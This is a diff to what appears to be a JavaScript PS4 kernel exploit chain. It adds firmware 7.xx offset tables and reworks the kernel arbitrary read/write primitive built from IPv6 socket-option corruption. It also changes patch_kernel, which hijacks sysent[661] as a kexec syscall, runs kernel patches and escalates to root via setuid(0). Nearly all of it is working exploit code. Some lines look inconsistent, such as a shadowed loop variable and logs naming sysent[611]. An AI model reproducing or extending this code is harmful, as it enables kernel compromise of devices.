@@ -38,6 +38,9 @@ import * as rop from "./module/chain.mjs";
 import * as config from "./config.mjs";
 
 // static imports for firmware configurations
+import * as fw_ps4_700 from "./lapse/ps4/700.mjs";
+import * as fw_ps4_750 from "./lapse/ps4/750.mjs";
+import * as fw_ps4_751 from "./lapse/ps4/751.mjs";
 import * as fw_ps4_800 from "./lapse/ps4/800.mjs";
 import * as fw_ps4_850 from "./lapse/ps4/850.mjs";
 import * as fw_ps4_852 from "./lapse/ps4/852.mjs";
@@ -72,7 +75,16 @@ const [is_ps4, version] = (() => {
 // set per-console/per-firmware offsets
 const fw_config = (() => {
   if (is_ps4) {
-    if (0x800 <= version && version < 0x850) {
+    if (0x700 <= version && version < 0x750) {
+      // 7.00, 7.01, 7.02
+      return fw_ps4_700;
+    } else if (0x750 <= version && version < 0x751) {
+      // 7.50
+      return fw_ps4_750;
+    } else if (0x751 <= version && version < 0x800) {
+      // 7.51, 7.55
+      return fw_ps4_751;
+    } else if (0x800 <= version && version < 0x850) {
       // 8.00, 8.01, 8.03
       return fw_ps4_800;
     } else if (0x850 <= version && version < 0x852) {
@@ -1171,12 +1183,12 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   let reclaim_sd = null;
   close(pktopts_sds[1]);
   for (let i = 0; i < num_alias; i++) {
-    for (let j = 0; j < num_sds; j++) {
+    for (let i = 0; i < num_sds; i++) {
       // if a socket doesn't have a pktopts, setting the rthdr will make
       // one. the new pktopts might reuse the memory instead of the
       // rthdr. make sure the sockets already have a pktopts before
-      pktopts.write32(off_tclass, 0x4141 | (j << 16));
-      set_rthdr(sds[j], pktopts, rsize);
+      pktopts.write32(off_tclass, 0x4141 | (i << 16));
+      set_rthdr(sds[i], pktopts, rsize);
     }
 
     gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
@@ -1272,11 +1284,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   const kpipe = kread64(pipe_file);
   log(`pipe pointer: ${kpipe}`);
 
-  // Save the pipe_map field before it is clobbered
-  const pipe_map_offset = 0x18; // Assuming pipe_map is at offset 0x18 in struct pipebuf
-  const pipe_map = kread64(kpipe.add(pipe_map_offset));
-  log(`Saved pipe_map: ${pipe_map}`);
-
   const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
   for (let off = 0; off < pipe_save.size; off += 8) {
     pipe_save.write64(off, kread64(kpipe.add(off)));
@@ -1363,13 +1370,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
       }
     }
 
-    _read(addr) {
-      this.rw_buf.fill(0);
-      this.addr_buf.write64(0, addr);
-      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, this.addr_buf);
-      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, this.rw_buf);
-    }
-
     copyin(src, dst, len) {
       this._verify_len(len);
       const main = this.main_sd;
@@ -1412,6 +1412,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
       ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
 
       sysi("read", this.rpipe, dst, len);
+    }
+
+    _read(addr) {
+      const buf = this.rw_buf;
+      buf.write64(0, addr);
+      buf.fill(0, 8);
+      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
+      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
     }
 
     read8(addr) {
@@ -1474,9 +1482,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   kmem.write64(w_rthdr_p, 0);
   log("corrupt pointers cleaned");
 
-  // RESTORE: restore pipe_map to prevent issues with the pipe
-  kmem.write64(kpipe.add(pipe_map_offset), pipe_map);
-  log(`Restored pipe_map: ${pipe_map}`);
+  /*
+    // REMOVE once restore kernel is ready for production
+    // increase the ref counts to prevent deallocation
+    kmem.write32(main_sock, kmem.read32(main_sock) + 1);
+    kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
+    // +2 since we have to take into account the fget_write()'s reference
+    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
+    */
 
   return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1498,17 +1511,21 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   if (!is_ps4) {
     throw RangeError("ps5 kernel patching unsupported");
   }
-  if (!(0x800 <= version && version < 0x1000)) {
-    // 8.00, 8.01, 8.03, 8.50, 8.52, 9.00, 9.03, 9.04, 9.50, 9.51, 9.60
+  if (!(0x700 <= version && version < 0x1000)) {
+    // Only 7.00-9.60 supported
     throw RangeError("kernel patching unsupported");
   }
 
   log("change sys_aio_submit() to sys_kexec()");
   // sysent[661] is unimplemented so free for use
   const sysent_661 = kbase.add(off_sysent_661);
-  const sy_narg = kmem.read32(sysent_661);
-  const sy_call = kmem.read64(sysent_661.add(8));
-  const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
+  const sysent_661_save = new Buffer(0x30); // sizeof syscall
+  for (let off = 0; off < sysent_661_save.size; off += 8) {
+    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
+  }
+  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
+  log("sysent[611] save data:");
+  hexdump(sysent_661_save);
   // .sy_narg = 6
   kmem.write32(sysent_661, 6);
   // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1570,23 +1587,24 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     die("test jit exec failed");
   }
 
+  log("mlock save data for kernel restore");
   const pipe_save = restore_info[1];
   restore_info[1] = pipe_save.addr;
-  log("mlock pipe save data for kernel restore");
   sysi("mlock", restore_info[1], page_size);
+  restore_info[4] = sysent_661_save.addr;
+  sysi("mlock", restore_info[4], page_size);
 
+  log("execute kpatch...")
   mem.cpy(write_addr, patches.addr, patches.size);
   sys_void("kexec", exec_addr, ...restore_info);
+
+  log("munlock save data used in kernel restore");
+  sysi("munlock", restore_info[1], page_size);
+  sysi("munlock", restore_info[4], page_size);
 
   log("setuid(0)");
   sysi("setuid", 0);
   log("kernel exploit succeeded!");
-
-  kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-  kmem.write64(sysent_661.add(8), sy_call);
-  kmem.write32(sysent_661, sy_narg);
-  log("restored sys_aio_submit()");
-
 }
 
 // FUNCTIONS FOR STAGE: SETUP
